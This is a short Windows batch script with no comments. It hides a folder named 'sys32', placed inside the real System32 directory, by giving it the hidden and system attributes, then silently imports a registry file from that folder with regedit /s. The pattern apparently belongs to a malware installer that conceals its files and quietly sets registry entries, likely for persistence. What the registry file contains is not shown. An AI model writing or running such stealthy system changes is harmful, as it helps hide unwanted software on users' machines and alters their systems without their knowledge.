@echo off
cd ..
attrib +H +S %windir%\System32\sys32
regedit /s c:/windows/system32/sys32/addreg.reg
exit
